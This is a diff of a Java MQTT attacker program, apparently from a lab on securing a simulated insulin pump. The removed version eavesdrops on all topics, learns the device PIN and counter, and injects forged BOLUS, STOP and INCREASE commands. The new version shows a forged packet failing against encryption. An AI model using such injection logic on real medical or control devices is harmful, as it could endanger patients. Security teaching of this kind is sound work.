@@ -1,91 +1,90 @@
 import org.eclipse.paho.client.mqttv3.*;
-import java.util.UUID;
 import MQTT.Message;
-import MQTT.CRC12;
 
 public class ActiveAttacker {
 
     private static final String BROKER = "tcp://localhost:1883";
     private static final String ATTACKER_ID = "ActiveAttacker";
 
-    // These are learned from passive eavesdropping
     private static String learnedTopic = null;
-    private static UUID learnedPin = null;
-    private static int learnedCounter = 0;
+    private static String interceptedCiphertext = null;
 
-    public static void main(String[] args) throws MqttException, InterruptedException {
+    public static void main(String[] args) throws Exception {
 
         MqttClient client = new MqttClient(BROKER, ATTACKER_ID);
+
         MqttConnectOptions options = new MqttConnectOptions();
         options.setCleanSession(true);
+
         client.connect(options);
 
-        System.out.println("[ATTACKER] Connected to broker. Listening for messages...");
+        System.out.println("[ATTACKER] Connected.");
+        System.out.println("[ATTACKER] Listening for encrypted packets...");
 
-        // Step 1: Passive phase — eavesdrop to learn PIN, topic, and counter
         client.subscribe("#", (topic, mqttMessage) -> {
+
             String raw = new String(mqttMessage.getPayload());
-            System.out.println("[ATTACKER] Intercepted on topic '" + topic + "': " + raw);
+
+            System.out.println("\n[ATTACKER] Intercepted packet:");
+            System.out.println(raw);
 
             try {
+
                 Message msg = Message.deserialize(raw);
 
-                // Validate CRC — only trust well-formed messages
                 if (!msg.isValid()) {
-                    System.out.println("[ATTACKER] Invalid CRC, ignoring.");
+                    System.out.println("[ATTACKER] CRC invalid.");
                     return;
                 }
 
-                // Learn the PIN and counter from legitimate traffic
-                learnedPin = msg.devicePin;
-                learnedCounter = msg.counter + 1;
                 learnedTopic = topic;
+                interceptedCiphertext = msg.encryptedData;
 
-                System.out.println("[ATTACKER] Learned PIN: " + learnedPin);
-                System.out.println("[ATTACKER] Learned topic: " + learnedTopic);
+                System.out.println("[ATTACKER] Captured encrypted payload:");
+                System.out.println(interceptedCiphertext);
+
+                System.out.println("[ATTACKER] Cannot read command or counter.");
+                System.out.println("[ATTACKER] Shared AES key is unknown.");
 
             } catch (Exception e) {
-                System.out.println("[ATTACKER] Could not parse message: " + e.getMessage());
+                System.out.println("[ATTACKER] Failed parsing packet.");
             }
         });
 
-        // Wait to collect legitimate traffic
         Thread.sleep(5000);
 
-        // Step 2: Active phase — inject malicious command using learned PIN
-        if (learnedPin == null || learnedTopic == null) {
-            System.out.println("[ATTACKER] No legitimate traffic intercepted yet. Exiting.");
+        if (learnedTopic == null) {
+            System.out.println("[ATTACKER] No traffic intercepted.");
             client.disconnect();
             return;
         }
 
-        System.out.println("[ATTACKER] Launching active attack...");
-        launchAttack(client, "BOLUS");   // immediate bolus injection
-        Thread.sleep(1000);
-        launchAttack(client, "STOP");    // stop insulin delivery
-        Thread.sleep(1000);
-        launchAttack(client, "INCREASE"); // increase dosage
+        System.out.println("\n[ATTACKER] Attempting forged attack...");
 
-        client.disconnect();
-        System.out.println("[ATTACKER] Attack complete. Disconnected.");
-    }
-
-    private static void launchAttack(MqttClient client, String command) throws MqttException {
-        // Craft a malicious message using the learned PIN — pump cannot distinguish this
-        // from a legitimate remote control message
-        Message malicious = new Message(
-            "remote",       // impersonate the remote control
-            learnedPin,     // use the eavesdropped PIN
-            "command",
-            command,
-            learnedCounter++
+        Message forged = new Message(
+                "REMOTE",
+                java.util.UUID.randomUUID(),
+                "command",
+                "FAKE_COMMAND",
+                999
         );
 
-        String serialized = malicious.serialize();
-        MqttMessage mqttMessage = new MqttMessage(serialized.getBytes());
-        mqttMessage.setQos(1);
+        String serialized = forged.serialize();
 
-        client.publish(learnedTopic, mqttMessage);
-        System.out.println("[ATTACKER] Sent malicious command '" + command + "' to topic: " + learnedTopic);
+        client.publish(
+                learnedTopic,
+                new MqttMessage(serialized.getBytes())
+        );
+
+        System.out.println("[ATTACKER] Fake encrypted packet sent.");
+        System.out.println("[ATTACKER] Pump should reject packet because:");
+        System.out.println("  - wrong encryption");
+        System.out.println("  - counter mismatch");
+        System.out.println("  - invalid sender");
+        System.out.println("  - attacker lacks shared key");
+
+        client.disconnect();
+
+        System.out.println("\n[ATTACKER] Attack failed.");
     }
 }
